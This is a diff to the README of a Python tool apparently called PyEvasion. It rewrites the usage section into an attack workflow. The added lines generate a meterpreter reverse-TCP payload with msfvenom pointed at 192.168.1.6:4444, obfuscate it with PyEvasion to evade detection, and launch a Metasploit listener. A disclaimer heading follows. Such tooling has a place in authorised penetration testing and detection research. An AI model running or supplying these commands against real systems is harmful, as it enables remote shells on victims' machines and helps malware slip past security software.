@@ -25,7 +25,9 @@ No external dependencies are required (uses standard Python libraries).
 
 ## Usage
 ```bash
-python3 PyEvasion.py -i input.py -o output.py -m evasion
+msfvenom -p python/meterpreter_reverse_tcp lhost=192.168.1.6 lport=4444 -o payload.py 
+python3 PyEvasion.py -i payload.py -o evade.py -m evasion
+msfconsole -r listener.rc
 ```
 ----
 ## ⚠️ Disclaimer
